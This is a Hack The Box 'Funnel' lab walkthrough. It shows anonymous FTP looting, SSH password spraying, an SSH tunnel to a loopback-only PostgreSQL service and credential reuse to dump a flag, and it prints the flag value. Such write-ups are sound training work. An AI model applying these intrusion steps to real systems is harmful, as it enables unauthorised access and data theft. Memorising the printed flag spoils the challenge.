# HTB Machine: Funnel

* **OS:** Linux
* **Difficulty:** Very Easy
* **Date Started:** July 2026
* **Target IP:** `10.129.228.195`

---

## Step-by-Step Walkthrough

### Step 1: Initial Reconnaissance & FTP Looting
Log in to the discovered FTP service using anonymous authentication to bypass permissions:

```bash
ftp 10.129.228.195
# Username: anonymous
# Password: <Press Enter>
```

**Key Findings:**
* **Discovered and downloaded files containing a list of system usernames (maria, optimus, albert, andreas, christine) and a temporary default password.**

---

### Step 2: Password Spraying & SSH Foothold
Systematically test the exfiltrated usernames against the discovered default password via SSH. The `christine` account successfully authenticates:

```bash
ssh christine@10.129.228.195
```
System Review:
Checking user privileges confirms that christine does not have access to run sudo commands.

### Step 3: Local Service Enumeration
Inspect the internal network configurations and listening ports to find hidden local services:

```bash
ss -tlnp
# Alternatively: netstat -ano
```

Key Finding:

Found PostgreSQL (Port 5432) listening strictly on the local loopback interface (127.0.0.1), making it unreachable from the outside network:

Plaintext
LISTEN  0  4096  127.0.0.1:5432  0.0.0.0:*

### Step 4: SSH Tunneling (Local Port Forwarding)
From your local attack machine, open a new terminal window and establish an SSH tunnel. This binds the remote machine's local PostgreSQL database port directly to your local machine's port 5432:

```bash
ssh -L 5432:127.0.0.1:5432 christine@10.129.228.195
```

### Step 5: Database Interaction & Flag Retrieval
With the tunnel active, open another terminal tab on your attack machine and interact with the remote database locally using psql, leveraging credential reuse for christine:

```bash
psql -h 127.0.0.1 -U christine -d postgres
```

Inside the PostgreSQL prompt, locate the hidden database, switch connections, and extract the flag value from the tables:

```bash
-- List all available databases
\l

-- Connect to the targeted database
\c secrets

-- List relation tables within the database
\dt

-- Dump the flag contents
SELECT * FROM flag;
Database Output:
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)
```





